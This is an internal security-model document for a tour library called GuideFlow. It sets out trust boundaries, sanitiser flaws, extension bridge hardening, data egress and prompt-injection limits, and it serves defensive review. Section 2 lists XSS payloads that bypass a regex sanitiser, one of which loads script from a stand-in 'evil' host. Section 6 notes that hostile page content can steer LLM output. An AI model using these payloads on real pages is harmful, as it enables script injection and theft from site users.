# Security model (internal)

The engineering-facing companion to the public [`SECURITY.md`](../../SECURITY.md). This document
states the trust boundaries and the rules that follow from them. Read it before touching the
renderer, the extension, `@guideflow/ai`, or the CLI.

Findings referenced here live in [`AUDIT.md`](AUDIT.md) §Security.

---

## 1. Trust boundaries

GuideFlow runs *inside* someone else's application, with their DOM, their users, and their data.
There are five boundaries, and only the first is trusted.

| # | Boundary | Trust | Enters the system at |
|---|---|---|---|
| 1 | Flow definitions written in the host app's own source | **trusted** | `createFlow()`, `start()` |
| 2 | `.flow.json` documents fetched over the network — a CDN or static host, a CMS, the devtools recorder | **untrusted** | `content.html`, `step.actions[].action`, `step.target` |
| 3 | The host page's DOM | **untrusted** | `serializeDOM()`, `autoInit()`'s `data-gf-*` attributes |
| 4 | LLM provider responses | **untrusted** | `validateSteps()`, `validateGuidedAnswer()` → selectors and rendered text |
| 5 | Page-world ↔ extension message channel | **untrusted** | `window.postMessage` in `bridge.ts` / `inspector.ts` |

Data that has crossed 2–5 must be treated as attacker-controlled at every subsequent sink, no matter
how many functions it has passed through.

### Boundary 2 is a supported path, and `parseFlowFile` is what enforces it

Remote flows are no longer hypothetical. [`apps/docs/guide/hosting-flows.md`](../../apps/docs/guide/hosting-flows.md)
documents the recipe we support, and it is `fetch` + `parseFlowFile` from
`@guideflow/core/authoring` + `gf.createFlow()`. There is no `loadFlows()`, no server package and no
hosted service; the library's whole contribution is the document format, the validator and the
versioning semantics.

**`parseFlowFile` is the boundary.** It parses, never repairs, never throws, and returns
`{ valid, errors, warnings, flow }`. A document that does not come back `valid` must not reach
`createFlow()`. It is a *structural* gate — it rejects shapes the engine mishandles (a dangling
transition, a duplicate step id, the truncating shape that also records a completion) — and it is
**not** a substitute for the sinks below: a structurally valid flow can still carry hostile
`content.html`, a hostile `step.actions[].action`, or a hostile `step.target`. Escaping,
allowlist sanitisation and the `querySelector` try/catch all still apply.

There is no `guideflow push`. That command was deleted in Phase 7.10 along with the endpoint it
posted to, which never existed; the CLI is `init`, `export`, `validate`.

---

## 2. Rendering — the primary sink

`DefaultRenderer.renderStep()` does `el.innerHTML = this._buildHTML(...)`. That single line is the
highest-value target in the codebase.

### Rules

1. **Text goes through `_esc()`.** Every interpolated value that is not deliberately HTML must be
   entity-escaped. Audit finding: `step.actions[].action` and `a.variant` are interpolated into
   attributes **unescaped** — a flow from boundary 2 can break out of the attribute.
2. **`content.html` is the only HTML path,** and it is the one that must be genuinely sanitised.
3. **The current sanitiser is not a security boundary.** `_sanitizeHTML()` is a regex denylist. It
   was empirically defeated by 6 of 8 trivial payloads:

   | Payload class | Why it survives |
   |---|---|
   | `<iframe src=javascript:alert(1)>` | the scheme regex requires a **quote** after `=` |
   | `<a href=javascript:alert(1)>` | same |
   | `<a href="jav&#x61;script:...">` | the literal text is not `javascript:`; the browser decodes the entity at parse time |
   | `<script src=//evil/x.js>` (unclosed) | the tag-stripping regexes require a matching closing tag |
   | `<svg><a xlink:href=javascript:...>` | `xlink:href` is not in the attribute list |
   | `style="background:url(javascript:...)"` | `style` is not filtered at all |

   Regex denylists cannot be fixed by adding more regexes. Every added pattern is one more thing an
   attacker enumerates around.

### The correct fix, within the zero-dependency constraint

`core` cannot take a DOMPurify dependency (ADR-002 — it is ~20 kB against a 12 kB budget). Ranked
options:

1. **Build the DOM, don't build a string.** Replace `_buildHTML` + `innerHTML` with
   `createElement`/`textContent`/`setAttribute`. This eliminates the escaping problem for everything
   *except* `content.html`, and is the change that should happen regardless.
2. **Parse-and-allowlist for `content.html`.** `new DOMParser().parseFromString(html, 'text/html')`,
   walk the tree, drop any element not on a small allowlist (`p b i em strong ul ol li a code br span
   img h1-h6`), drop any attribute not on a per-element allowlist, and validate `href`/`src` against
   `^(https?:|mailto:|\/|#)` **after** resolving with `new URL()`. This is ~60 lines and costs well
   under 1 kB.
3. **Or move `content.html` behind an opt-in subpath** (`@guideflow/core/html`) that ships a real
   sanitiser, and make `content.html` a no-op in the default build. Honest, and cheapest to secure.

Until one of these lands, `SECURITY.md` must keep telling integrators that `content.html` is not a
security boundary.

---

## 3. Selector sinks

`step.target` and `GuidedAnswer.highlights` reach `document.querySelector()`. This is not XSS — CSS
selectors do not execute script — but:

- An invalid selector makes `querySelector` **throw**. From boundary 4 (model output) that is an
  unhandled exception on a code path with no `try`.
- A selector is an oracle: `:has()` and attribute selectors let attacker-supplied strings probe page
  structure. Low severity, worth knowing.

Rule: wrap every `querySelector` fed by boundary 2–4 data in a try/catch and treat a throw as
"no target".

---

## 4. Attribute-tour compatibility

`intro-compat.ts` reads `data-gf-show-if` and walks it as a property path, gated by
`/^[a-zA-Z_$][a-zA-Z0-9_$.]*$/`. The regex correctly blocks call syntax, so this is **not** an eval.

Residual risks to keep in mind: the path can name `constructor` or `__proto__` and walk the prototype
chain, and it can invoke a getter with side effects. Both require the attacker to already control
page markup (boundary 3), and the result is only coerced to a boolean. Acceptable today; add a
segment denylist (`__proto__`, `constructor`, `prototype`) when convenient.

---

## 5. The devtools extension

This is the sharpest boundary in the project, because the extension holds privileges the page does
not.

### The bridge is a public channel

`bridge.ts` runs in the **page world**. It shares `window`'s message bus with every other script on
the page, so the channel is public by construction — a string sentinel on `data.source` is not
authentication, and it never will be.

Before Phase 3.4 that was the *whole* of the access control: the content script relayed anything
bearing `'__gf_bridge__'` straight into `chrome.runtime`, which gave any page a write primitive into
`chrome.storage` via `GF_SAVE_FLOW`.

### What is enforced now (Phase 3.4)

1. **Type allowlist.** `content/inspector.ts` relays exactly four types — `GF_DETECTED`,
   `GF_FLOWS_LIST`, `GF_TOUR_EVENT`, `GF_ACTIVE_TOUR_STATE`. Every other type is dropped before
   `chrome.runtime.sendMessage`. Adding a type means adding a validator.
2. **Per-type shape validation.** Each payload is checked (plain object / bounded array / bounded
   event name) and then round-tripped through JSON, so only acyclic, size-bounded, prototype-free
   data crosses. A freshly-built object is forwarded, never the page's own reference.
3. **Per-page-load nonce.** The content script mints a random nonce, stamps it on the injected
   `<script>` tag as `data-gf-nonce`, and both ends require it on every message. bridge.js reads it
   from `document.currentScript` — which is why the bridge is injected as a *classic* script and
   `vite.config.ts` wraps the bundle in an IIFE.
4. **Concrete `targetOrigin`.** Both directions post to `window.location.origin` (falling back to
   `'*'` only for opaque/exotic origins, where no serialised origin exists).
5. **Sender provenance in the background.** `chrome.runtime.onMessage` drops anything where
   `sender.id !== chrome.runtime.id`, then splits by origin: content scripts (`sender.tab?.id`) may
   only report tab state and be relayed to that tab's panel; extension pages (`sender.tab ===
   undefined`) are the only senders permitted to touch `chrome.storage`. Flow deletion is confined
   to the `gf_flow_` key namespace.
6. **Manifest.** `host_permissions: ["<all_urls>"]` and the unused `tabs` permission are gone —
   `optional_host_permissions` replaces the former, and a
   `content_security_policy.extension_pages` of `script-src 'self'; object-src 'self'` is declared.
   The `<all_urls>` **content script** stays: a tour library has no fixed origin set, and the
   reasoning is written down in `content/inspector.ts`'s header.

### Residual risk — read this before relaxing anything

The nonce **raises the bar; it does not make the channel private.** A page script that observes the
injection can read `data-gf-nonce` off the DOM, and any script can listen on `window` for what the
bridge posts. So:

- **Never put anything on this channel that the page must not see.** Today that holds: everything
  crossing it is tour metadata the page already owns.
- **Assume everything from the bridge is hostile** anyway. Validate shape and type on arrival; never
  pass a payload straight into a privileged API.
- **Never render page-derived strings into the panel or popup via `innerHTML` /
  `dangerouslySetInnerHTML` / an `href` or `src` sink.** The panel is extension-privileged; XSS
  there is privilege escalation.
- **Never `chrome.scripting.executeScript` a page-derived string.**

The end state — a `MessageChannel` transferred once at injection time, which the page cannot join
after the fact — is tracked as `devtools-bridge-postmessage-wildcard-exfiltration` (P3) and is the
only thing that actually closes the read side.

### Recording and PII

The recorder writes to `chrome.storage`, so it is a data-retention surface. It must never capture
the value of a `password` or `hidden` input, a field whose `autocomplete` names a credential, OTP or
payment card, or anything inside a `[data-gf-private]` subtree; those record `'[redacted]'` plus a
`redacted: true` flag instead. Element *labels* inside a private subtree are redacted the same way,
and `buildSelector` will not embed an `aria-label` from a private subtree into a selector.

---

## 6. `@guideflow/ai`

### API keys

Provider options accept `apiKey`, defaulting to `process.env`. The README example passes
`import.meta.env.VITE_OPENAI_KEY` — a **client-bundle** variable, i.e. published to every visitor.

Rules:

1. The **documented default** must be a server-side proxy. Browser-direct usage is the advanced,
   caveated path.
2. Ship a `ProxyProvider` that posts to the host app's own endpoint, so the correct thing is also the
   easy thing.
3. If a provider is constructed in a browser with a key present, warn loudly at runtime.
4. `MockProvider` should be the default in examples and the demo.

### Data egress

`serializeDOM()` sends up to 80 elements to a third party: `window.location.href` (query strings
routinely carry session tokens and ids), `document.title`, and per element a selector, role, geometry,
and a **label derived from `textContent`** (any text up to 80 characters) or `placeholder`.

It does *not* read input `value`s — that is the one thing it gets right.

It nonetheless means arbitrary page text — names, balances, order numbers, email addresses rendered
in a heading or table cell — leaves the user's browser for an LLM vendor, with **no redaction, no
allowlist, no consent gate, and no opt-out**. That is a data-processing decision the integrator must
make knowingly.

Required work: a redaction hook, a `[data-gf-private]` skip attribute, an opt-in element allowlist,
a documented DPA position, and `url` reduced to origin + path by default.

### Prompt injection

Page content (boundary 3) is serialized into the prompt; model output (boundary 4) becomes selectors
and displayed text. A hostile page can attempt to steer generation. `validateSteps()` limits the blast
radius usefully — it keeps only `id`, `title`, `body`, `target` and a whitelisted `placement`, and
notably **drops `actions`, `html`, `meta` and `showIf`** — so model output cannot currently reach the
HTML sink. Preserve that property: if you extend `validateSteps` to pass more fields through, you are
connecting boundary 4 to the renderer, and the sanitiser has to be fixed first.

### Cost as availability

`GuideBrain.watch()` issues one LLM call per user pause, with no cap, cooldown, or budget. A page with
a busy interaction pattern bills the integrator continuously. Rate limiting is a security control here,
not just a feature.

---

## 7. `@guideflow/analytics`

Every event carries `url` and `referrer`. Those are the most reliable PII carriers on the web
(`?email=`, `?token=`, `/orders/12345`).

Required: a consent gate before any transport fires, a Do-Not-Track check, a URL-scrubbing hook with
a sane default (strip query and fragment), sampling, and documentation of exactly what each transport
sends where.

`WebhookTransport`'s `apiKey` becomes an `Authorization: Bearer` header **from the browser** — it is
public by construction. Document it as a low-privilege ingest token, never a real API key.

---

## 8. CLI

The CLI is three commands: `init`, `export`, `validate`. It makes no network calls and handles no
credential, so it has no `--api-key` and no `--endpoint` to get wrong. `push` and `studio` are both
gone — `push` was deleted in Phase 7.10, and with it the credential-in-`argv` and
`--endpoint`-accepts-any-URL problems this section used to list.

- `init` and `export` write files at user-supplied paths. Resolve, confine to the project root, and
  never overwrite without a prompt or `--force`.
- `validate` reads user-supplied paths and parses untrusted JSON. It must never `eval`, never import
  a `.ts`/`.js` flow module, and never exit 0 on an unreadable file.
- **Do not add a command that takes a credential.** Anything in `argv` lands in shell history and
  process listings. If publishing ever needs auth, it belongs in the user's own deploy tool — see
  [`hosting-flows.md`](../../apps/docs/guide/hosting-flows.md), which deliberately ends at
  `aws s3 cp`.

---

## 9. Supply chain

Current gaps, all in `.github/workflows/`:

- No npm **provenance** (`--provenance` + `id-token: write`).
- No dependency review, no `npm audit`, no Dependabot, no CodeQL.
- `files` includes `src`, so source headers — including a personal email address — are published to
  npm. Decide whether that is intended.
- No lockfile-integrity or `npm pack --dry-run` verification before publish.

---

## 10. Review checklist

Before merging anything that touches a boundary:

- [ ] Every value interpolated into HTML is escaped or allowlist-sanitised
- [ ] Every `querySelector` fed by untrusted data is inside a try/catch
- [ ] No new message type crosses the extension bridge without shape validation
- [ ] Nothing page-derived reaches an extension-privileged DOM sink
- [ ] No API key path leads to a client bundle
- [ ] No new field is added to `validateSteps` output without checking where it lands
- [ ] Any new data leaving the browser is enumerated in `SECURITY.md`
- [ ] New network calls are bounded — timeout, abort signal, retry cap
